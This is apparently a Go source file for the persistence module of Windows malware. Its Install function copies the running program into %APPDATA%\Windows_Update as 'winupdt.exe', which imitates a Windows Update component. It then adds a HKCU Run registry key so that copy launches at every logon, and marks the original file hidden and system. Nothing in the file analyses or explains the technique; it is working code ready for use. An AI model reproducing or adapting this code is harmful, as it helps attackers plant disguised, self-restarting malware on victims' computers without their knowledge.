package installer

import (
  "fmt"
	"os"
	"os/exec"
	"strings"
  "log"
)

func Install() {
	if !(strings.Contains(os.Args[0], "winupdt.exe")) {
		run("mkdir %APPDATA%\\Windows_Update")
		run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
		run("attrib +H +S " + os.Args[0])
	} 
}

func run(cmd string) {
	c := exec.Command("cmd", "/C", cmd)

    if err := c.Run(); err != nil {
        fmt.Println("Error: ", err)
    }
}
